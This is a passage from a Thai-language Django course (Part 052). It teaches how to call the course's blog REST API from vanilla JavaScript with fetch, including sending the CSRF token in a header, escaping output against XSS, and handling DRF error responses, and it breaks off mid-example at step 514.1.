# Part 052: Django กับ JavaScript และ Fetch API

> **ขั้นตอนที่ 511-520 ของหลักสูตร** | Phase 6: Frontend Integration
>
> เป้าหมายของ Part นี้: เชื่อมฝั่ง **Frontend (JavaScript ล้วน ๆ ไม่มี framework)** เข้ากับ
> **Blog REST API** ที่คุณสร้างไว้เต็มรูปแบบตลอด Phase 5 (Part 039-050 — `ViewSet` +
> `Router` จาก Part 044, `SearchFilter`/pagination envelope จาก Part 047,
> `SessionAuthentication` + CSRF จาก Part 045) คุณจะเรียนรู้ **Fetch API** ตั้งแต่พื้นฐาน
> ที่สุดไปจนถึงระดับที่ใช้งานจริงในโปรเจกต์การผลิต: ยิง GET/POST/PATCH ไปยัง API, แนบ
> **CSRF Token** ผ่าน header `X-CSRFToken` อย่างถูกต้อง, อัปเดต DOM แบบไดนามิกโดยไม่ reload
> หน้า, ส่งฟอร์มคอมเมนต์แบบ async, ทำ **Live Search** ด้วยเทคนิค **Debounce** และ
> `AbortController`, จัดการ **Loading/Error state** อย่างมืออาชีพ, จัดระเบียบโค้ดด้วย
> **ES Modules**, และปิดท้ายด้วยการเกริ่น **Build Tool สมัยใหม่** (esbuild/Vite) ที่จะกลับมา
> เจาะลึกอีกครั้งตอนเรียน React (Part 055) และ Vue (Part 056) เมื่อจบ Part นี้ คุณจะเขียนหน้า
> Django Template ที่ "คุยกับ" REST API ของตัวเองแบบ SPA-lite ได้อย่างมั่นใจ โดยไม่ต้องพึ่ง
> framework ฝั่งหน้าบ้านใด ๆ เลย

---

## สารบัญของ Part นี้

- ขั้นตอนที่ 511: การใส่ JavaScript ใน Django Template — ทบทวน static files (Part 009), แยก JS ออกจาก inline script
- ขั้นตอนที่ 512: Fetch API เบื้องต้น — ยิง GET request ไปยัง Blog REST API จาก Vanilla JS
- ขั้นตอนที่ 513: ยิง POST request พร้อมแนบ CSRF Token ผ่าน `fetch()` (header `X-CSRFToken`)
- ขั้นตอนที่ 514: จัดการ JSON Response และอัปเดต DOM แบบไดนามิก (ไม่ reload หน้า)
- ขั้นตอนที่ 515: ส่งฟอร์มผ่าน AJAX โดยไม่ reload หน้า (submit comment แบบ async)
- ขั้นตอนที่ 516: Debounce การพิมพ์ค้นหาแบบ live search ที่ยิง API ทุกครั้งที่พิมพ์
- ขั้นตอนที่ 517: จัดการ Loading state และ Error handling ใน JS (แสดง spinner, error message)
- ขั้นตอนที่ 518: การจัดระเบียบโค้ด JavaScript (แยกเป็น module, หลีกเลี่ยง inline script ปนใน template)
- ขั้นตอนที่ 519: เกริ่น Build Tool สมัยใหม่ (esbuild/Vite) สำหรับ bundle JS ของโปรเจกต์ขนาดใหญ่
- ขั้นตอนที่ 520: สรุปและแบบฝึกหัด — สร้างฟีเจอร์ Live Search สำหรับบล็อกที่ยิง API แบบ debounce

---

## ขั้นตอนที่ 511: การใส่ JavaScript ใน Django Template — ทบทวน static files (Part 009), แยก JS ออกจาก inline script

### 511.1 ทบทวนเส้นทางที่พาเรามาถึงจุดนี้

ตลอด Phase 5 (Part 039-050) เราสร้าง **Blog REST API** ที่สมบูรณ์แบบมืออาชีพ:

- `PostViewSet`, `CategoryViewSet`, `CommentViewSet` ผ่าน `ModelViewSet` + `DefaultRouter`
  (Part 044) ให้ endpoint `/api/posts/`, `/api/categories/`,
  `/api/posts/{post_pk}/comments/` ครบทั้ง CRUD
- `SessionAuthentication` + `IsAuthenticatedOrReadOnly` (Part 045) พร้อมกลไก CSRF สองชั้น
  ที่ Part 045 ขั้นตอนที่ 449 อธิบายไว้ละเอียด
- `SearchFilter`, `OrderingFilter`, `DjangoFilterBackend` และ pagination envelope แบบ
  กำหนดเอง (`success`/`meta`/`links`/`data`) จาก Part 047
- JWT authentication สำหรับ client ภายนอก (Part 046), Versioning/Throttling (Part 048),
  เอกสาร OpenAPI อัตโนมัติ (Part 049) และชุดทดสอบครบวงจร (Part 050)

จนถึงตอนนี้ API ของเรา**ยังไม่มีใครใช้งานจริงเลยนอกจาก `curl`, `httpie` และ Browsable API**
Part นี้เปิด **Phase 6: Frontend Integration** — เราจะเขียน **JavaScript ฝั่ง browser** ที่
รันบนหน้า Django Template เดิม (ที่ผ่านมาตั้งแต่ Part 008) แล้วให้มันคุยกับ REST API
ของเราเองผ่าน **Fetch API** ซึ่งเป็นมาตรฐานของเบราว์เซอร์ยุคใหม่ทุกตัว ไม่ต้องติดตั้ง
library ใด ๆ เพิ่มเลย

### 511.2 ทบทวนโครงสร้าง Static Files จาก Part 009 อย่างรวบรัด

Part 009 วางรากฐานเรื่องไฟล์ static ไว้ครบแล้ว มาทบทวนสิ่งที่ Part นี้จะใช้ซ้ำตลอด:

| แนวคิดจาก Part 009 | จะใช้ใน Part นี้อย่างไร |
|---|---|
| `blog/static/blog/js/` (App-level static, ขั้นตอนที่ 81.3) | ไฟล์ JS ทั้งหมดของ Part นี้อยู่ในโฟลเดอร์นี้ |
| `{% load static %}` + `{% static 'blog/js/xxx.js' %}` (ขั้นตอนที่ 81.6) | โหลดไฟล์ JS ทุกไฟล์ผ่าน tag นี้ ห้าม hardcode path |
| `{% block extra_js %}` ใน `base.html` (ขั้นตอนที่ 83.4) | จุดที่เราจะใส่ `<script>` ของแต่ละหน้า |
| `collectstatic` (ขั้นตอนที่ 82) | ต้องรันก่อน deploy เสมอ เพื่อให้ไฟล์ JS ใหม่ถูกรวบรวมไปที่ `STATIC_ROOT` |

หากยังไม่มีโฟลเดอร์นี้ในเครื่อง ให้สร้างก่อน:

```bash
mkdir -p blog/static/blog/js
```

### 511.3 ปัญหาของ Inline `<script>` ในหน้า Template

หลายคนเริ่มเขียน JavaScript ใน Django project ด้วยการแปะโค้ดตรง ๆ ใน template แบบนี้:

```html
<!-- ตัวอย่างที่ไม่แนะนำ: inline script ปนอยู่กลาง template -->
{% extends "base.html" %}
{% block content %}
<div id="post-list"></div>

<script>
    fetch('/api/posts/')
        .then(function (response) { return response.json(); })
        .then(function (data) {
            document.getElementById('post-list').innerHTML =
                data.data.map(function (post) {
                    return '<p>' + post.title + '</p>';
                }).join('');
        });
</script>
{% endblock %}
```

โค้ดนี้ **ทำงานได้จริง** แต่มีปัญหาเชิงวิศวกรรมซอฟต์แวร์หลายข้อ:

| ปัญหา | รายละเอียด |
|---|---|
| ไม่มี Browser Caching | ทุกครั้งที่โหลดหน้า HTML ใหม่ browser ต้องโหลด JS ก้อนนี้ใหม่เสมอ (ผูกติดกับ HTML) ต่างจากไฟล์ `.js` แยกที่ browser cache แยกจาก HTML ได้ |
| Reuse ไม่ได้ | ถ้าอีกหน้าต้องการ logic เดียวกัน ต้อง copy-paste โค้ดซ้ำ |
| Content Security Policy (CSP) | นโยบายความปลอดภัยระดับมืออาชีพมักบล็อก inline script (`unsafe-inline`) เพื่อป้องกัน XSS — โค้ด inline จะถูกเบราว์เซอร์ปฏิเสธการรันทันที |
| Debug ยาก | DevTools แสดงไฟล์ inline เป็นส่วนหนึ่งของ HTML document ไม่ใช่ไฟล์แยกที่ตั้ง breakpoint/source map ได้สะดวก |
| Linter/Formatter เข้าไม่ถึง | เครื่องมืออย่าง ESLint, Prettier (ที่จะกล่าวถึงในขั้นตอนที่ 519) ทำงานกับไฟล์ `.js` เท่านั้น ไม่ใช่ script ที่ฝังใน `.html` |

**กฎเหล็กของ Part นี้**: โค้ด JavaScript ทั้งหมดจะอยู่ใน **ไฟล์ `.js` แยกต่างหาก** ภายใต้
`blog/static/blog/js/` เสมอ template จะมีแค่ `<script src="...">` เท่านั้น ไม่มีโค้ดลอจิก
ปนอยู่ในไฟล์ `.html` เลยแม้แต่บรรทัดเดียว

### 511.4 เขียนไฟล์ JS แยกไฟล์แรก และเชื่อมกับ template

```javascript
// blog/static/blog/js/hello.js
console.log('บล็อก JavaScript โหลดสำเร็จแล้ว!');
```

```html
<!-- blog/templates/blog/post_list.html (ต่อยอดจาก Part 009 ขั้นตอนที่ 83.4) -->
{% extends "base.html" %}
{% load static %}

{% block title %}บทความทั้งหมด{% endblock %}

{% block extra_css %}
    <link rel="stylesheet" href="{% static 'blog/css/blog.css' %}">
{% endblock %}

{% block content %}
<div class="post-list">
    <h1>บทความทั้งหมด</h1>
    <div id="post-list-container">
        {% for post in posts %}
            <article class="post-card">
                <h2 class="post-card__title">
                    <a href="{% url 'blog:detail' slug=post.slug %}">{{ post.title }}</a>
                </h2>
            </article>
        {% endfor %}
    </div>
</div>
{% endblock %}

{% block extra_js %}
    <script src="{% static 'blog/js/blog.js' %}"></script>
    <script src="{% static 'blog/js/hello.js' %}"></script>
{% endblock %}
```

เปิดหน้านี้แล้วดู Console ใน DevTools (F12) ควรเห็นข้อความ `บล็อก JavaScript โหลดสำเร็จแล้ว!`
— นี่คือจุดเริ่มต้นที่เราจะต่อยอดไปเป็นการเรียก API จริงในขั้นตอนที่ 512

### 511.5 ตำแหน่งของ `<script>` และ attribute `defer`/`async`

| รูปแบบ | HTML parsing หยุดรอไหม | ลำดับการรัน | เหมาะกับ |
|---|---|---|---|
| `<script src="...">` (ธรรมดา, วางบน `<head>`) | ✅ หยุดรอจนโหลด+รันเสร็จ | ตามลำดับที่เขียน | ไม่แนะนำสำหรับ JS ทั่วไป (บล็อกการแสดงผลหน้า) |
| `<script src="..." defer>` | ❌ ไม่หยุด (โหลดคู่ขนานกับ parsing) | รันตามลำดับ **หลัง** HTML parse เสร็จ | **ค่าเริ่มต้นที่แนะนำ** สำหรับ JS ที่ต้องเข้าถึง DOM |
| `<script src="..." async>` | ❌ ไม่หยุด | รันทันทีที่โหลดเสร็จ (**ไม่รับประกันลำดับ**) | สคริปต์อิสระที่ไม่ต้องพึ่ง DOM หรือสคริปต์อื่น (เช่น analytics) |
| วาง `<script>` ไว้ท้ายสุดก่อน `</body>` (แบบเก่า) | ✅ (แต่มาหลัง DOM พร้อมแล้ว) | ตามลำดับที่เขียน | ยังใช้ได้ แต่ `defer` ยืดหยุ่นกว่า (วางใน `<head>` ได้โดยไม่บล็อก) |

ตั้งแต่ Part นี้เป็นต้นไป เราจะใช้ `defer` เป็นค่าเริ่มต้นเสมอ เพราะรับประกันว่า:

1. HTML ทั้งหน้าถูก parse และ DOM พร้อมใช้งานแล้วก่อนสคริปต์จะรัน (ไม่ต้องพึ่ง
   `DOMContentLoaded` event เหมือนที่ Part 009 ขั้นตอนที่ 83.3 เคยทำ)
2. ไฟล์หลายไฟล์ที่มี `defer` รันตามลำดับที่ประกาศไว้เสมอ (ต่างจาก `async`)

```html
{% block extra_js %}
    <script src="{% static 'blog/js/blog.js' %}" defer></script>
    <script src="{% static 'blog/js/hello.js' %}" defer></script>
{% endblock %}
```

### 511.6 ส่งข้อมูลจาก Django ไปยัง JS อย่างปลอดภัยด้วย `json_script`

บ่อยครั้งที่ JS ฝั่ง client ต้องรู้ข้อมูลที่ Django render มาให้ตอนแรก เช่น username ของ
ผู้ใช้ปัจจุบัน หรือ slug ของบทความที่กำลังดูอยู่ วิธีที่ **ไม่ปลอดภัย** คือฝังค่าตรง ๆ ใน
inline script (`var slug = "{{ post.slug }}";`) เพราะเสี่ยงต่อ XSS หากค่านั้นมีอักขระพิเศษ
ที่ไม่ได้ escape ถูกวิธี — Django มี template filter ที่ออกแบบมาแก้ปัญหานี้โดยเฉพาะ:
**`json_script`**

```html
<!-- blog/templates/blog/post_detail.html -->
{% extends "base.html" %}
{% load static %}

{% block content %}
<article data-slug="{{ post.slug }}">
    <h1>{{ post.title }}</h1>
    <div class="post-content">{{ post.content|linebreaks }}</div>
    <div id="comment-list"></div>
    <div id="comment-form-container"></div>
</article>

{# json_script แปลงค่า Python เป็น JSON ที่ปลอดภัยจาก XSS แล้วฝังในแท็ก <script type="application/json"> #}
{{ request.user.username|json_script:"current-username" }}
{{ post.id|json_script:"post-id" }}
{% endblock %}

{% block extra_js %}
    <script src="{% static 'blog/js/post-detail.js' %}" defer></script>
{% endblock %}
```

```javascript
// blog/static/blog/js/post-detail.js
// อ่านค่าที่ json_script ฝังไว้ ด้วย JSON.parse(element.textContent) — ปลอดภัยเสมอ
// เพราะ json_script เข้ารหัสอักขระอันตราย (</script>, &, <, >) ให้อัตโนมัติ
const currentUsername = JSON.parse(
    document.getElementById('current-username').textContent
);
const postId = JSON.parse(document.getElementById('post-id').textContent);

console.log('ผู้ใช้ปัจจุบัน:', currentUsername || '(ยังไม่ login)');
console.log('Post ID:', postId);
```

**ข้อควรจำ**: `json_script` ปลอดภัยกว่าการฝังค่าตรง ๆ เสมอ เพราะ Django escape อักขระ
`<`, `>`, `&` ให้อัตโนมัติในรูปแบบ Unicode escape (`<` แทน `<` เป็นต้น) ทำให้ไม่มีทาง
ที่เนื้อหาผู้ใช้ (เช่น username ที่ตั้งชื่อแปลก ๆ) จะ "แหก" ออกจากแท็ก `<script>` แล้วรันโค้ด
อันตรายได้ — ต่างจากการต่อสตริงแบบ `var x = "{{ value }}";` ที่เสี่ยงมาก

---

## ขั้นตอนที่ 512: Fetch API เบื้องต้น — ยิง GET request ไปยัง Blog REST API จาก Vanilla JS

### 512.1 Fetch API คืออะไร

**Fetch API** คือ interface มาตรฐานของเบราว์เซอร์สำหรับส่ง HTTP request จาก JavaScript
โดยไม่ต้องพึ่ง library ภายนอก (เช่น jQuery หรือ Axios) มันคืน **`Promise`** เสมอ ทำให้เขียน
โค้ดแบบ `.then()` chain หรือ `async/await` ได้

```javascript
// รูปแบบพื้นฐานที่สุดของ fetch()
fetch('/api/posts/')
    .then((response) => response.json())
    .then((data) => console.log(data))
    .catch((error) => console.error('เกิดข้อผิดพลาด:', error));
```

หรือเขียนแบบ `async/await` ซึ่งอ่านง่ายกว่าและเป็นรูปแบบที่ Part นี้จะใช้ตลอด:

```javascript
async function loadPosts() {
    const response = await fetch('/api/posts/');
    const data = await response.json();
    console.log(data);
}

loadPosts();
```

### 512.2 โครงสร้าง `Response` Object — จุดที่มือใหม่พลาดบ่อยที่สุด

**สิ่งสำคัญที่สุดที่ต้องเข้าใจ**: `fetch()` **resolve เป็น success เสมอ** ตราบใดที่ได้รับ
HTTP response กลับมา (แม้จะเป็น `404` หรือ `500` ก็ตาม!) มันจะ **reject** (เข้า `.catch()`)
ก็ต่อเมื่อเกิดปัญหาระดับเครือข่ายจริง ๆ เช่น ไม่มีอินเทอร์เน็ต, CORS บล็อก, หรือ DNS หา
เซิร์ฟเวอร์ไม่เจอเท่านั้น

```javascript
const response = await fetch('/api/posts/does-not-exist/');
console.log(response.ok);      // false (เพราะ status เป็น 404)
console.log(response.status);  // 404
// แต่โค้ดยังทำงานต่อได้ปกติ ไม่กระโดดไป catch!
```

| Property/Method ของ `Response` | ความหมาย |
|---|---|
| `response.ok` | `true` เมื่อ status อยู่ในช่วง 200-299 เท่านั้น |
| `response.status` | HTTP status code ตัวเลข เช่น `200`, `404`, `403` |
| `response.statusText` | ข้อความอธิบาย status เช่น `"Not Found"` |
| `response.json()` | คืน `Promise` ที่ resolve เป็น object จาก JSON body (ใช้บ่อยที่สุดกับ DRF) |
| `response.text()` | คืน `Promise` ที่ resolve เป็น string ดิบ (ใช้เมื่อ response ไม่ใช่ JSON) |
| `response.headers.get('Content-Type')` | อ่าน response header |

**บทเรียนสำคัญ**: ต้องเช็ค `response.ok` เอง**ทุกครั้ง** ก่อนใช้ข้อมูล ไม่เช่นนั้นโค้ดจะ
พยายาม parse JSON ของหน้า error (หรือ error message ของ DRF) ราวกับเป็นข้อมูลปกติ ซึ่งจะ
ทำให้ debug งงมาก — เราจะเขียน wrapper function ที่จัดการเรื่องนี้ให้อัตโนมัติในขั้นตอนที่
517

### 512.3 ยิง GET จริงไปยัง `/api/posts/`

ทบทวนจาก Part 047: endpoint `/api/posts/` คืนค่าเป็น **envelope ที่มี pagination**
ไม่ใช่ array ตรง ๆ:

```json
{
    "success": true,
    "meta": {
        "total_items": 18,
        "total_pages": 2,
        "current_page": 1,
        "page_size": 10,
        "has_next": true,
        "has_previous": false
    },
    "links": {
        "next": "http://127.0.0.1:8000/api/posts/?page=2",
        "previous": null
    },
    "data": [
        {"id": 1, "title": "เริ่มต้นกับ Django", "slug": "เริ่มต้นกับ-django", "...": "..."}
    ]
}
```

ดังนั้นเมื่อดึงข้อมูลบทความ ต้องเข้าถึงผ่าน `data.data` (field ชื่อ `data` ที่อยู่ **ข้างใน**
object หลัก) ไม่ใช่ `data` ตรง ๆ — นี่คือรายละเอียดที่ต้องจำให้แม่นเสมอเมื่อทำงานกับ API นี้

```javascript
// blog/static/blog/js/blog.js
async function fetchPosts() {
    const response = await fetch('/api/posts/');

    if (!response.ok) {
        throw new Error(`โหลดบทความไม่สำเร็จ: ${response.status} ${response.statusText}`);
    }

    const payload = await response.json();
    return payload.data;   // ดึงเฉพาะ array ของบทความจาก envelope
}
```

### 512.4 Render ผลลัพธ์ลง DOM

```javascript
// blog/static/blog/js/blog.js (ต่อจากด้านบน)

function renderPostCard(post) {
    return `
        <article class="post-card">
            <h2 class="post-card__title">
                <a href="/posts/${post.slug}/">${escapeHtml(post.title)}</a>
            </h2>
            <p class="post-card__meta">โดย ${escapeHtml(post.author)}</p>
        </article>
    `;
}

// ป้องกัน XSS เมื่อนำข้อความจาก API ไปแทรกใน HTML ด้วย template literal
// (สำคัญมาก จะอธิบายเหตุผลแบบเต็มในขั้นตอนที่ 514.2)
function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

async function initPostList() {
    const container = document.getElementById('post-list-container');
    if (!container) return;   // หน้านี้ไม่มี container นี้ ไม่ต้องทำอะไร

    try {
        const posts = await fetchPosts();
        container.innerHTML = posts.map(renderPostCard).join('');
    } catch (error) {
        container.innerHTML = `<p class="error-message">${error.message}</p>`;
    }
}

initPostList();
```

เชื่อมกับ template:

```html
{% block extra_js %}
    <script src="{% static 'blog/js/blog.js' %}" defer></script>
{% endblock %}
```

เปิดหน้า `post_list.html` ตอนนี้จะเห็นรายการบทความที่ **ดึงมาจาก REST API ผ่าน JavaScript**
แทนที่จะ render จาก context ของ Django View โดยตรง (แม้ในตัวอย่างนี้ผลลัพธ์ที่เห็นจะดู
เหมือนเดิม แต่กลไกเบื้องหลังเปลี่ยนไปโดยสิ้นเชิง — นี่คือรากฐานของทุกอย่างที่จะเรียนต่อจาก
นี้ไป)

### 512.5 ตารางเปรียบเทียบ Fetch API vs XMLHttpRequest vs jQuery.ajax

| คุณสมบัติ | `fetch()` | `XMLHttpRequest` (XHR) | `jQuery.ajax()` |
|---|---|---|---|
| Syntax | Promise-based, ทันสมัย | Callback-based, เก่า | Callback/Deferred, ต้องพึ่ง jQuery |
| ต้องติดตั้ง library เพิ่มไหม | ❌ ไม่ต้อง (มากับเบราว์เซอร์) | ❌ ไม่ต้อง | ✅ ต้องโหลด jQuery ทั้งไลบรารี (~30KB) |
| Reject เมื่อ HTTP status เป็น error (4xx/5xx) หรือไม่ | ❌ ไม่ reject (ต้องเช็ค `response.ok` เอง) | ขึ้นกับ event handler ที่เขียน | ✅ เข้า `.fail()` อัตโนมัติเมื่อ status ไม่ใช่ 2xx |
| รองรับ `async/await` โดยตรง | ✅ | ❌ ต้อง wrap เป็น Promise เอง | ⚠️ ผ่าน `.then()` ได้ (jqXHR เป็น Promise-like) |
| ยกเลิก request กลางคัน | ✅ ผ่าน `AbortController` (ขั้นตอนที่ 516.4) | ✅ ผ่าน `.abort()` | ✅ ผ่าน `.abort()` |
| ติดตาม upload progress | ❌ ไม่รองรับโดยตรง (ต้องใช้ XHR หรือ `ReadableStream` ขั้นสูง) | ✅ รองรับ (`progress` event) | ✅ รองรับ (ผ่าน XHR ภายใน) |
| นิยมในโปรเจกต์ใหม่ (2025-2026) | ✅ มาตรฐานปัจจุบัน | ❌ legacy code เท่านั้น | ❌ ลดความนิยมลงมากเมื่อ Vanilla JS ทำได้เทียบเท่า |

**คำแนะนำของหลักสูตรนี้**: ใช้ `fetch()` เป็นค่าเริ่มต้นเสมอสำหรับโปรเจกต์ใหม่ ยกเว้นกรณี
พิเศษที่ต้องการ upload progress bar แบบละเอียด (Part 058 จะกลับมาพูดถึงกรณีนี้อีกครั้ง)

### 512.6 ทดสอบผ่าน Browser DevTools

เปิด DevTools (F12) → แท็บ **Network** → refresh หน้า → กรองด้วยคำว่า `posts` จะเห็น request
ไปยัง `/api/posts/` พร้อมรายละเอียด:

- **Headers**: ดู request headers ที่เบราว์เซอร์แนบไปอัตโนมัติ (`Accept`, `Cookie` ที่มี
  `sessionid`/`csrftoken`)
- **Preview/Response**: ดู JSON ที่ได้กลับมา ตรงกับ envelope ที่คาดไว้ในขั้นตอนที่ 512.3
- **Timing**: ดูว่า request ใช้เวลานานแค่ไหน มีประโยชน์มากตอน optimize ในขั้นตอนที่ 517

นี่คือเครื่องมือ debug หลักที่จะใช้ตลอดทั้ง Part นี้ แนะนำให้เปิดค้างไว้เสมอเวลาพัฒนา
ฟีเจอร์ที่เกี่ยวกับ `fetch()`

---

## ขั้นตอนที่ 513: ยิง POST request พร้อมแนบ CSRF Token ผ่าน `fetch()` (header `X-CSRFToken`)

### 513.1 ทบทวนกับดัก CSRF จาก Part 045

Part 045 ขั้นตอนที่ 449 อธิบายไว้ละเอียดแล้วว่า `SessionAuthentication` **เพิ่ม CSRF check
กลับเข้ามาเอง** สำหรับ unsafe HTTP method (`POST`, `PUT`, `PATCH`, `DELETE`) แม้ว่า DRF
`APIView` จะปิด CSRF middleware ของ Django ไว้ตั้งแต่ต้นก็ตาม (Part 042 ขั้นตอนที่ 412.3)

ทบทวนตารางสำคัญจาก Part 045 ขั้นตอนที่ 449.2:

| Authenticate ผ่านทางไหน | ต้องแนบ CSRF token ไหม |
|---|---|
| `SessionAuthentication` (cookie `sessionid`) | **ต้องแนบเสมอ** สำหรับ unsafe method |
| `TokenAuthentication`/`JWTAuthentication` (header `Authorization`) | ไม่ต้องเลย |

เพราะ JavaScript ในหน้า Django Template ของเราทำงานแบบ **same-origin** (คุยกับ API ที่
domain เดียวกัน ผ่าน cookie `sessionid` เดิมที่ผู้ใช้ login ค้างไว้) นี่คือกรณีที่ต้องแนบ
`X-CSRFToken` header เสมอทุกครั้งที่ยิง POST/PUT/PATCH/DELETE — Part นี้จะเจาะลึกวิธีเขียน
โค้ดจริงให้สมบูรณ์กว่าตัวอย่างสั้น ๆ ที่ Part 045 ขั้นตอนที่ 449.4 แสดงไว้

### 513.2 อ่านค่า CSRF Token จาก Cookie

Django เก็บ CSRF token ไว้ใน cookie ชื่อ `csrftoken` โดยอัตโนมัติ (ตราบใดที่หน้าเว็บมีการ
render `{% csrf_token %}` หรือ view ใช้ `ensure_csrf_cookie` อย่างน้อยหนึ่งครั้ง) เราอ่านค่า
นี้ด้วยฟังก์ชัน `getCookie()`:

```javascript
// blog/static/blog/js/csrf.js

function getCookie(name) {
    const cookieValue = document.cookie
        .split('; ')
        .find((row) => row.startsWith(`${name}=`));

    return cookieValue ? decodeURIComponent(cookieValue.split('=')[1]) : null;
}

// HTTP method ที่ "ปลอดภัย" ตามมาตรฐาน RFC 7231 ไม่ต้องแนบ CSRF token
// (ทบทวนแนวคิด "safe method" จาก Part 006/007 เรื่อง HTTP verbs)
const CSRF_SAFE_METHODS = ['GET', 'HEAD', 'OPTIONS', 'TRACE'];

function isCsrfSafeMethod(method) {
    return CSRF_SAFE_METHODS.includes(method.toUpperCase());
}
```

**ข้อควรระวังสำคัญ**: cookie `csrftoken` จะมีค่าก็ต่อเมื่อหน้าเว็บที่โหลดอยู่ **เคย** ผ่าน
view ที่ตั้ง cookie นี้มาก่อน (view ที่ render `{% csrf_token %}` ในฟอร์มใด ๆ ของหน้านั้น
หรือ endpoint ที่ decorate ด้วย `@ensure_csrf_cookie`) หากหน้าที่ไม่มีฟอร์มใด ๆ เลย
`getCookie('csrftoken')` อาจคืนค่า `null` — วิธีแก้คือใส่ `{% csrf_token %}` ไว้ในฟอร์มที่
ซ่อนอยู่สักจุดหนึ่งของหน้า (ตัวอย่างในขั้นตอนที่ 515) หรือใช้ decorator ตรง ๆ:

```python
# blog/views.py
from django.views.decorators.csrf import ensure_csrf_cookie
from django.utils.decorators import method_decorator
from django.views.generic import DetailView
from .models import Post


@method_decorator(ensure_csrf_cookie, name='dispatch')
class PostDetailView(DetailView):
    """
    ensure_csrf_cookie รับประกันว่า cookie csrftoken จะถูกตั้งเสมอ
    แม้หน้านี้จะไม่มี <form> ที่ใช้ {% csrf_token %} เลยก็ตาม —
    จำเป็นเพราะหน้านี้จะยิง fetch(POST) ไปยัง API ผ่าน JavaScript (ขั้นตอนที่ 515)
    """
    model = Post
    template_name = 'blog/post_detail.html'
    context_object_name = 'post'
```

### 513.3 เขียน `apiFetch()` — wrapper function ที่แนบ CSRF header อัตโนมัติ

แทนที่จะเขียนโค้ดแนบ header ซ้ำทุกครั้งที่เรียก `fetch()` เราสร้างฟังก์ชันกลางที่ทำหน้าที่นี้
ให้เสมอ:

```javascript
// blog/static/blog/js/api.js
// ต้องโหลดไฟล์ csrf.js ก่อนไฟล์นี้ (ดู <script> order ในขั้นตอนที่ 511.5)

async function apiFetch(url, options = {}) {
    const method = (options.method || 'GET').toUpperCase();

    const headers = {
        'Content-Type': 'application/json',
        ...options.headers,
    };

    // แนบ X-CSRFToken เฉพาะ unsafe method เท่านั้น (ตามตารางในขั้นตอนที่ 513.1)
    if (!isCsrfSafeMethod(method)) {
        headers['X-CSRFToken'] = getCookie('csrftoken');
    }

    const response = await fetch(url, {
        ...options,
        method,
        headers,
        credentials: 'same-origin',   // แนบ cookie sessionid/csrftoken ไปด้วยเสมอ
    });

    return response;
}
```

**อธิบายทีละส่วน**:

- `credentials: 'same-origin'` **จำเป็นมาก** — ถ้าไม่ใส่ บาง browser (โดยเฉพาะเมื่อหน้าเว็บ
  ถูกโหลดจาก origin ที่ต่างเล็กน้อย เช่น port ต่างกัน) อาจไม่แนบ cookie ไปด้วย ทำให้ Django
  มองว่าเป็น anonymous request ทันที
- `Content-Type: application/json` บอก DRF ว่า body เป็น JSON ให้ parser
  (`JSONParser`, Part 039 ขั้นตอนที่ 383) แปลงเป็น `request.data` ให้ถูกต้อง
- ฟังก์ชันนี้ **ไม่** เช็ค `response.ok` ให้ (ปล่อยให้ผู้เรียกใช้จัดการเอง) เพราะ error
  handling แต่ละที่ต้องการพฤติกรรมต่างกัน — เราจะเพิ่มชั้น error handling แยกในขั้นตอนที่ 517

### 513.4 ตัวอย่างเต็ม: สร้างบทความใหม่ผ่าน `fetch()` POST

```html
<!-- blog/templates/blog/post_create.html -->
{% extends "base.html" %}
{% load static %}

{% block title %}เขียนบทความใหม่{% endblock %}

{% block content %}
<div class="post-form">
    <h1>เขียนบทความใหม่</h1>
    {# ใส่ {% csrf_token %} ไว้เพื่อให้แน่ใจว่า cookie csrftoken ถูกตั้งเสมอ (ขั้นตอนที่ 513.2) #}
    {% csrf_token %}

    <form id="create-post-form">
        <label for="id_title">หัวข้อ</label>
        <input type="text" id="id_title" name="title" required>

        <label for="id_content">เนื้อหา</label>
        <textarea id="id_content" name="content" rows="8" required></textarea>

        <button type="submit">เผยแพร่บทความ</button>
        <p id="form-error" class="error-message" hidden></p>
    </form>
</div>
{% endblock %}

{% block extra_js %}
    <script src="{% static 'blog/js/csrf.js' %}" defer></script>
    <script src="{% static 'blog/js/api.js' %}" defer></script>
    <script src="{% static 'blog/js/post-create.js' %}" defer></script>
{% endblock %}
```

```javascript
// blog/static/blog/js/post-create.js
document.getElementById('create-post-form').addEventListener('submit', async (event) => {
    event.preventDefault();   // สำคัญมาก: ป้องกันไม่ให้ browser reload หน้าตามพฤติกรรม
                               // ปกติของ <form> (จะเจาะลึกใน 515.2)

    const form = event.target;
    const errorBox = document.getElementById('form-error');
    errorBox.hidden = true;

    const payload = {
        title: form.title.value,
        content: form.content.value,
    };

    try {
        const response = await apiFetch('/api/posts/', {
            method: 'POST',
            body: JSON.stringify(payload),
        });

        if (!response.ok) {
            const errorData = await response.json();
            throw new Error(JSON.stringify(errorData));
        }

        const newPost = await response.json();
        window.location.href = `/posts/${newPost.slug}/`;   // redirect ไปหน้าบทความใหม่
    } catch (error) {
        errorBox.textContent = `บันทึกไม่สำเร็จ: ${error.message}`;
        errorBox.hidden = false;
    }
});
```

ทดสอบ: login ผ่าน Django admin หรือหน้า login ปกติก่อน (เพื่อให้มี `sessionid` cookie) แล้ว
เปิดหน้านี้กรอกฟอร์ม กด submit — network tab จะเห็น request `POST /api/posts/` พร้อม header
`X-CSRFToken` และไม่มีการ reload หน้าเว็บเลย

### 513.5 ทดสอบว่า CSRF check ทำงานจริงด้วยการลบ header ทิ้ง

ลองคอมเมนต์บรรทัดที่แนบ `X-CSRFToken` ใน `apiFetch()` ชั่วคราวแล้วลองสร้างบทความอีกครั้ง
ควรได้ response:

```
HTTP/1.1 403 Forbidden
Content-Type: application/json

{"detail":"CSRF Failed: CSRF token missing."}
```

นี่คือการยืนยันด้วยมือของคุณเองว่ากลไก CSRF สองชั้นจาก Part 045 ทำงานจริง ไม่ใช่แค่ทฤษฎี —
อย่าลืม uncomment บรรทัดนั้นกลับก่อนไปขั้นตอนถัดไป

---

## ขั้นตอนที่ 514: จัดการ JSON Response และอัปเดต DOM แบบไดนามิก (ไม่ reload หน้า)

### 514.1 รูปแบบ Error Response ของ DRF ที่ JS ต้องรู้จัก

ก่อนจะอัปเดต DOM ให้ถูกต้อง ต้องเข้าใจก่อนว่า error จาก DRF (Part 042 ขั้นตอนที่ 415) มีสอง
รูปแบบหลัก:

```json
// 1. Validation Error (400) — key ตรงกับชื่อ field ที่ผิด
{
    "title": ["This field may not be blank."],
    "content": ["This field is required."]
}
```

```json
// 2. Permission/Not Found Error (403/404) — key คงที่ชื่อ "detail"
{
    "detail": "You do not have permission to perform this action."
}
```

```javascript
